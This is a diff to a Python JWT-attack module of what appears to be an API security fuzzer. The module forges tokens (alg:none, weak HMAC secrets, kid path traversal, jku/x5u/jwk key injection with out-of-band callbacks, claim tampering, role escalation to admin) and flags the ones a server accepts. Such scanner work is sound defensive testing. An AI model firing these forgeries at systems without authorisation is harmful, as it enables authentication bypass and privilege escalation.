@@ -1,8 +1,11 @@
-"""JWT-specific attacks.
+"""JWT-specific attacks (Phase 3 rework).
 
-If the provided Authorization header carries a JWT, run a small battery of
-forged tokens against a representative endpoint and flag any that the server
-accepts (HTTP 2xx).
+If the provided Authorization header carries a JWT, run a battery of
+forged tokens against a representative endpoint. Findings are now
+**differential**: an anonymous baseline is established first, and forged-token
+responses are compared against it. A forged token is only flagged when it
+produces a 2xx that is materially different from the anonymous baseline —
+preventing false positives on public endpoints.
 
 All JWT manipulation is implemented with stdlib only (`base64`, `hmac`,
 `hashlib`, `json`) so apifuzz keeps its dependency footprint tight.
@@ -15,11 +18,14 @@ import hashlib
 import hmac
 import json
 import time
-from typing import Dict, List, Optional, Tuple
+from dataclasses import dataclass, field
+from typing import Any, Dict, List, Optional, Tuple
 
 import requests
 
 from analyzer import Finding
+from comparators import ResponseComparison, compare_http_responses
+
 
 
 CATEGORY = "jwt"
@@ -31,10 +37,18 @@ WEAK_HMAC_SECRETS = [
     "", "null", "none",
 ]
 
+# HS algorithm family supported for weak-secret signing.
+HS_ALGORITHMS = {
+    "HS256": hashlib.sha256,
+    "HS384": hashlib.sha384,
+    "HS512": hashlib.sha512,
+}
+
 
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
+
 
 def _b64url_encode(data: bytes) -> str:
     return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
@@ -77,11 +91,13 @@ def _build_token(header: Dict, payload: Dict, signature: bytes) -> str:
     return f"{h}.{p}.{s}"
 
 
-def _sign_hs256(header: Dict, payload: Dict, secret: bytes) -> str:
+def _sign_hs(header: Dict, payload: Dict, secret: bytes, algorithm: str = "HS256") -> str:
+    """Sign a token with the specified HS algorithm (HS256/384/512)."""
+    hash_func = HS_ALGORITHMS.get(algorithm.upper(), hashlib.sha256)
     h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
     p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
     signing_input = f"{h}.{p}".encode()
-    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
+    sig = hmac.new(secret, signing_input, hash_func).digest()
     return f"{h}.{p}.{_b64url_encode(sig)}"
 
 
@@ -99,6 +115,8 @@ def _mk(
     request_headers: Optional[Dict[str, str]] = None,
     response_body: Optional[str] = None,
     response_headers: Optional[Dict[str, str]] = None,
+    confidence: str = "strong",
+    comparison_summary: str = "",
 ) -> Finding:
     from analyzer import capture_body
     captured, truncated = capture_body(response_body)
@@ -121,7 +139,261 @@ def _mk(
         response_body=captured,
         response_headers=dict(response_headers or {}),
         response_truncated=truncated,
+        confidence=confidence,
+        owasp_api="API2:2023",
+        cwe="CWE-347",
+        comparison_summary=comparison_summary,
     )
+
+
+# ---------------------------------------------------------------------------
+# Differential evaluation
+# ---------------------------------------------------------------------------
+
+
+@dataclass
+class JWTObservation:
+    """A single JWT probe observation for differential comparison."""
+    label: str
+    token: str
+    status_code: int = 0
+    headers: Dict[str, str] = field(default_factory=dict)
+    body: str = ""
+    error: Optional[str] = None
+
+
+def _send_token(
+    session: requests.Session,
+    method: str,
+    url: str,
+    token: str,
+    timeout: float,
+) -> Optional[JWTObservation]:
+    """Send a request with a forged token and return the observation."""
+    forged_headers = {"Authorization": f"Bearer {token}"}
+    try:
+        resp = session.request(
+            method, url, headers=forged_headers,
+            timeout=timeout, allow_redirects=False,
+        )
+        return JWTObservation(
+            label="",
+            token=token,
+            status_code=resp.status_code,
+            headers=dict(resp.headers),
+            body=resp.text or "",
+        )
+    except requests.exceptions.RequestException as exc:
+        return JWTObservation(label="", token=token, error=str(exc))
+
+
+def _send_anonymous(
+    session: requests.Session,
+    method: str,
+    url: str,
+    timeout: float,
+) -> Optional[JWTObservation]:
+    """Send a request with no Authorization header."""
+    try:
+        resp = session.request(
+            method, url, timeout=timeout, allow_redirects=False,
+        )
+        return JWTObservation(
+            label="anonymous",
+            token="",
+            status_code=resp.status_code,
+            headers=dict(resp.headers),
+            body=resp.text or "",
+        )
+    except requests.exceptions.RequestException as exc:
+        return JWTObservation(label="anonymous", token="", error=str(exc))
+
+
+def _evaluate_forgery(
+    forged: JWTObservation,
+    anonymous: Optional[JWTObservation],
+) -> Tuple[bool, str]:
+    """Determine whether a forged token represents a real vulnerability.
+
+    Returns (is_vulnerable, comparison_summary).
+    A forged token is only flagged when:
+      1. It produces a 2xx response, AND
+      2. The anonymous baseline did NOT also produce a materially
+         equivalent 2xx (i.e., the endpoint is not public).
+    """
+    if forged.error or not (200 <= forged.status_code < 300):
+        return False, ""
+
+    if anonymous is None or anonymous.error:
+        # No anonymous baseline — flag but with lower confidence.
+        return True, "No anonymous baseline available for comparison."
+
+    anon_success = 200 <= anonymous.status_code < 300
+    if anon_success:
+        comparison = compare_http_responses(
+            baseline_status=anonymous.status_code,
+            baseline_headers=anonymous.headers,
+            baseline_body=anonymous.body,
+            candidate_status=forged.status_code,
+            candidate_headers=forged.headers,
+            candidate_body=forged.body,
+        )
+        if comparison.equivalent:
+            return False, (
+                f"Forged token response equivalent to anonymous baseline "
+                f"({comparison.summary}) — endpoint appears public."
+            )
+
+    return True, (
+        f"Forged token produced 2xx while anonymous baseline did not "
+        f"(anonymous: {anonymous.status_code}, forged: {forged.status_code})."
+    )
+
+
+# ---------------------------------------------------------------------------
+# Token forgery generators
+# ---------------------------------------------------------------------------
+
+
+def _forge_alg_none(header: Dict, payload: Dict) -> Tuple[str, str, str]:
+    none_header = {**header, "alg": "none"}
+    return _build_token(none_header, payload, b""), "JWT alg:none accepted", "alg:none"
+
+
+def _forge_weak_hmac(header: Dict, payload: Dict, secret: str, alg: str = "HS256") -> Tuple[str, str, str]:
+    forged = _sign_hs(header, payload, secret.encode(), alg)
+    return forged, f"JWT signed with weak HMAC secret accepted: {secret!r}", f"weak HMAC secret ({alg})"
+
+
+def _forge_expired(header: Dict, payload: Dict, signature: bytes) -> Tuple[str, str, str]:
+    expired_payload = dict(payload)
+    expired_payload["exp"] = int(time.time()) - 3600
+    return _build_token(header, expired_payload, signature), "Expired JWT accepted", "expired token replay"
+
+
+def _forge_kid_traversal(header: Dict, payload: Dict) -> Tuple[str, str, str]:
+    kid_header = dict(header)
+    kid_header["kid"] = "../../../../../../dev/null"
+    try:
+        kid_token = _sign_hs({**kid_header, "alg": "HS256"}, payload, b"")
+    except Exception:
+        kid_token = _build_token({**kid_header, "alg": "none"}, payload, b"")
+    return kid_token, "JWT kid path-traversal accepted", "kid injection"
+
+
+def _forge_claim_mutation(
+    header: Dict, payload: Dict, signature: bytes, claim: str, value: Any, title: str, technique: str,
+) -> Tuple[str, str, str]:
+    """Forge a token with a mutated claim, reusing the original signature."""
+    mutated = dict(payload)
+    mutated[claim] = value
+    return _build_token(header, mutated, signature), title, technique
+
+
+def _forge_key_confusion(header: Dict, payload: Dict, oast_url: str, kind: str = "jku") -> Tuple[str, str, str]:
+    """Forge a token whose header points key resolution at attacker-controlled material.
+
+    ``kind`` is 'jku' (JWKS URL), 'x5u' (X.509 URL), or 'jwk' (inline embedded key).
+    For jku/x5u the URL is an OAST allocation; a callback proves the server
+    fetches attacker-controlled key material. The token itself is signed with
+    an empty HMAC secret — servers that trust the header to source keys often
+    resolve to empty/attacker bytes and accept the token.
+    """
+    confused = dict(header)
+    confused["alg"] = "HS256"  # force symmetric after key sourcing
+    if kind == "jku":
+        confused["jku"] = oast_url.rstrip("/") + "/.well-known/jwks.json"
+    elif kind == "x5u":
+        confused["x5u"] = oast_url.rstrip("/") + "/attacker-cert.pem"
+    elif kind == "jwk":
+        confused["jwk"] = {"kty": "oct", "k": _b64url_encode(b"")}
+    forged = _sign_hs(confused, payload, b"", "HS256")
+    titles = {
+        "jku": "JWT jku header: server fetched attacker JWKS",
+        "x5u": "JWT x5u header: server fetched attacker certificate",
+        "jwk": "JWT embedded jwk accepted (self-signed token)",
+    }
+    techniques = {
+        "jku": "jku key-source injection",
+        "x5u": "x5u key-source injection",
+        "jwk": "embedded jwk trust",
+    }
+    return forged, titles[kind], techniques[kind]
+
+
+def run_jwt_key_confusion(
+    *,
+    auth_header: Optional[str],
+    target_url: str,
+    target_method: str,
+    target_endpoint_path: str,
+    session: requests.Session,
+    timeout: float,
+    oast=None,
+) -> List[Finding]:
+    """Probe jku/x5u/jwk header trust with OAST correlation.
+
+    Requires an available OAST provider; returns [] otherwise. Most relevant
+    for asymmetric algorithms (RS/ES/PS) where the server must fetch key
+    material — but HS servers with header-trust bugs are also probed.
+    """
+    findings: List[Finding] = []
+    parsed = parse_bearer_jwt(auth_header)
+    if parsed is None or oast is None or not getattr(oast, "available", False):
+        return findings
+    header, payload, signature, _raw = parsed
+    alg = str(header.get("alg", "")).upper()
+    if not (alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS")):
+        # Key sourcing matters for asymmetric verification; HS tokens with
+        # jku are unusual enough that probing adds noise.
+        return findings
+
+    for kind in ("jku", "x5u", "jwk"):
+        try:
+            allocation = oast.allocate(check_id=f"jwt_{kind}")
+        except Exception:
+            continue
+        token, title, technique = _forge_key_confusion(
+            header, payload, allocation.http_url, kind,
+        )
+        obs = _send_token(session, target_method, target_url, token, timeout)
+        if obs is None or obs.error:
+            continue
+
+        # Correlate: OAST callback proves key fetching; a 2xx with the forged
+        # token proves the forged key was trusted. Either alone is strong.
+        if kind == "jwk":
+            vulnerable = 200 <= obs.status_code < 300
+            evidence = "Server accepted a token whose header embedded its own signing key."
+        else:
+            import time as _time
+            _time.sleep(0.1)
+            interactions = oast.poll(allocation)
+            vulnerable = bool(interactions)
+            evidence = (
+                f"OAST token {allocation.token} received {len(interactions)} "
+                f"interaction(s) after supplying {kind} pointing at attacker infrastructure."
+            )
+        if vulnerable:
+            findings.append(
+                _mk(
+                    "critical",
+                    title,
+                    endpoint=target_endpoint_path,
+                    method=target_method,
+                    request_url=target_url,
+                    evidence=evidence,
+                    payload=token,
+                    technique=technique,
+                    status_code=obs.status_code,
+                    request_headers={"Authorization": f"Bearer {token}"},
+                    response_body=obs.body,
+                    response_headers=obs.headers,
+                    confidence="confirmed",
+                    comparison_summary="",
+                )
+            )
+    return findings
 
 
 # ---------------------------------------------------------------------------
@@ -138,32 +410,29 @@ def run_jwt_attacks(
     session: requests.Session,
     timeout: float,
 ) -> List[Finding]:
-    """Attempt JWT forgeries against the given target endpoint."""
+    """Attempt JWT forgeries against the given target endpoint.
+
+    Phase 3 rework: establishes an anonymous baseline and only flags
+    forged tokens that produce a materially different 2xx response.
+    """
     parsed = parse_bearer_jwt(auth_header)
     if parsed is None:
         return []
     header, payload, signature, raw_token = parsed
     findings: List[Finding] = []
+    alg = str(header.get("alg", "")).upper()
 
-    # If the original auth was already accepted (2xx), distinguishing forgery
-    # success would need a comparison endpoint — but typically users supply
-    # tokens that authenticate, and our baseline either 2xx'd or 401'd. We only
-    # flag forgeries that produce a 2xx when the *unauth* baseline would be 401.
-    # As a proxy: we just call with each forged token and look for 2xx.
+
+    # Establish anonymous baseline for differential comparison.
+    anon_obs = _send_anonymous(session, target_method, target_url, timeout)
 
     def _try(token: str, title: str, severity: str, evidence: str, technique: str):
-        forged_headers = {"Authorization": f"Bearer {token}"}
-        try:
-            resp = session.request(
-                target_method,
-                target_url,
-                headers=forged_headers,
-                timeout=timeout,
-                allow_redirects=False,
-            )
-        except requests.exceptions.RequestException:
+        obs = _send_token(session, target_method, target_url, token, timeout)
+        if obs is None or obs.error:
             return
-        if 200 <= resp.status_code < 300:
+        is_vuln, comparison = _evaluate_forgery(obs, anon_obs)
+        if is_vuln:
+            confidence = "strong" if anon_obs and not (200 <= anon_obs.status_code < 300) else "medium"
             findings.append(
                 _mk(
                     severity,
@@ -171,91 +440,118 @@ def run_jwt_attacks(
                     endpoint=target_endpoint_path,
                     method=target_method,
                     request_url=target_url,
-                    evidence=f"{evidence} (HTTP {resp.status_code}).",
+                    evidence=f"{evidence} (HTTP {obs.status_code}). {comparison}",
                     payload=token,
                     technique=technique,
-                    status_code=resp.status_code,
-                    request_headers=forged_headers,
-                    response_body=resp.text or "",
-                    response_headers=dict(resp.headers),
+                    status_code=obs.status_code,
+                    request_headers={"Authorization": f"Bearer {token}"},
+                    response_body=obs.body,
+                    response_headers=obs.headers,
+                    confidence=confidence,
+                    comparison_summary=comparison,
                 )
             )
 
     # 1. alg: none
-    none_header = {**header, "alg": "none"}
-    none_token = _build_token(none_header, payload, b"")
-    _try(
-        none_token,
-        "JWT alg:none accepted",
-        "critical",
-        "Server accepted a token forged with alg=none and an empty signature",
-        "alg:none",
-    )
+    token, title, technique = _forge_alg_none(header, payload)
+    _try(token, title, "critical",
+          "Server accepted a token forged with alg=none and an empty signature",
+          technique)
 
     # 2. Weak HMAC secret (only if original header.alg is an HS variant)
-    alg = str(header.get("alg", "")).upper()
     if alg.startswith("HS"):
         for secret in WEAK_HMAC_SECRETS:
-            try:
-                forged = _sign_hs256(header, payload, secret.encode())
-            except Exception:
-                continue
-            forged_headers = {"Authorization": f"Bearer {forged}"}
-            try:
-                resp = session.request(
-                    target_method, target_url, headers=forged_headers, timeout=timeout, allow_redirects=False
-                )
-            except requests.exceptions.RequestException:
-                continue
-            if 200 <= resp.status_code < 300:
-                findings.append(
-                    _mk(
-                        "critical",
-                        f"JWT signed with weak HMAC secret accepted: {secret!r}",
-                        endpoint=target_endpoint_path,
-                        method=target_method,
-                        request_url=target_url,
-                        evidence=f"Server accepted a token signed with HMAC secret {secret!r} (HTTP {resp.status_code}).",
-                        payload=forged,
-                        technique="weak HMAC secret",
-                        status_code=resp.status_code,
-                        request_headers=forged_headers,
-                        response_body=resp.text or "",
-                        response_headers=dict(resp.headers),
-                    )
-                )
-                break  # one is enough
+            before = len(findings)
+            token, title, technique = _forge_weak_hmac(header, payload, secret, alg)
+            _try(token, title, "critical",
+                  f"Server accepted a token signed with HMAC secret {secret!r}",
+                  technique)
+            if len(findings) > before:
+                break  # one accepted secret is enough evidence
 
-    # 3. Expired token replay (only when 'exp' present and in the past, OR force it)
-    expired_payload = dict(payload)
-    expired_payload["exp"] = int(time.time()) - 3600
-    # Reuse the original signature with the modified payload. A correctly
-    # validating server will reject (signature mismatch); an incorrectly
-    # validating one might accept the unchanged signature.
-    expired_token = _build_token(header, expired_payload, signature)
-    _try(
-        expired_token,
-        "Expired JWT accepted (with original signature)",
-        "high",
-        "Server accepted a token whose 'exp' claim was set to an hour ago",
-        "expired token replay",
-    )
+    # 3. Expired token replay
+    token, title, technique = _forge_expired(header, payload, signature)
+    _try(token, title, "high",
+          "Server accepted a token whose 'exp' claim was set to an hour ago",
+          technique)
 
-    # 4. `kid` injection — path traversal style
+    # 4. kid injection — path traversal style
     if "kid" in header or alg.startswith("HS") or alg.startswith("RS"):
-        kid_header = dict(header)
-        kid_header["kid"] = "../../../../../../dev/null"
-        # Sign with empty HMAC secret — many libraries default to "" when kid resolves nowhere.
-        try:
-            kid_token = _sign_hs256({**kid_header, "alg": "HS256"}, payload, b"")
-        except Exception:
-            kid_token = _build_token({**kid_header, "alg": "none"}, payload, b"")
-        _try(
-            kid_token,
-            "JWT kid path-traversal accepted",
-            "high",
-            "Server accepted a token with kid pointing at a traversable file resolving to empty bytes",
-            "kid injection",
-        )
+        token, title, technique = _forge_kid_traversal(header, payload)
+        _try(token, title, "high",
+              "Server accepted a token with kid pointing at a traversable file",
+              technique)
+
+    # 5. Claim mutations (Phase 3 additions)
+    now = int(time.time())
+
+    # iss (issuer) mutation
+    token, title, technique = _forge_claim_mutation(
+        header, payload, signature, "iss", "https://evil.example.com",
+        "JWT with forged 'iss' claim accepted", "iss claim mutation",
+    )
+    _try(token, title, "high",
+          "Server accepted a token with a forged issuer claim",
+          technique)
+
+    # aud (audience) mutation
+    token, title, technique = _forge_claim_mutation(
+        header, payload, signature, "aud", "attacker-controlled-audience",
+        "JWT with forged 'aud' claim accepted", "aud claim mutation",
+    )
+    _try(token, title, "high",
+          "Server accepted a token with a forged audience claim",
+          technique)
+
+    # nbf (not-before) mutation — set to future
+    token, title, technique = _forge_claim_mutation(
+        header, payload, signature, "nbf", now + 86400,
+        "JWT with future 'nbf' claim accepted", "nbf claim mutation",
+    )
+    _try(token, title, "medium",
+          "Server accepted a token whose 'nbf' is in the future",
+          technique)
+
+    # iat (issued-at) mutation — set to far past
+    token, title, technique = _forge_claim_mutation(
+        header, payload, signature, "iat", now - 86400 * 365,
+        "JWT with forged 'iat' claim accepted", "iat claim mutation",
+    )
+    _try(token, title, "low",
+          "Server accepted a token with a forged issued-at claim",
+          technique)
+
+    # exp (expiration) mutation — set to far future
+    token, title, technique = _forge_claim_mutation(
+        header, payload, signature, "exp", now + 86400 * 365,
+        "JWT with forged 'exp' claim accepted", "exp claim mutation",
+    )
+    _try(token, title, "medium",
+          "Server accepted a token with an expiration far in the future",
+          technique)
+
+    # role/scope escalation (if role or scope claims present)
+    for claim_name in ("role", "scope", "roles", "scopes", "permissions"):
+        if claim_name in payload:
+            escalated_value = "admin" if "role" in claim_name.lower() else ["admin", "superuser", "*"]
+            token, title, technique = _forge_claim_mutation(
+                header, payload, signature, claim_name, escalated_value,
+                f"JWT with escalated '{claim_name}' claim accepted", f"{claim_name} claim escalation",
+            )
+            _try(token, title, "high",
+                  f"Server accepted a token with escalated '{claim_name}' claim",
+                  technique)
+
+    # Duplicate claim keys (parser confusion)
+    try:
+        h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        payload_str = json.dumps(payload, separators=(",", ":"))
+        dup_payload = payload_str.rstrip("}") + f',"{list(payload.keys())[0]}":"attacker"' + "}"
+        dup_token = f"{h}.{_b64url_encode(dup_payload.encode())}.{_b64url_encode(signature)}"
+        _try(dup_token, "JWT with duplicate claim key accepted", "medium",
+              "Server accepted a token with duplicate claim keys (parser confusion)",
+              "duplicate claim key")
+    except Exception:
+        pass  # pragma: no cover
 
     return findings
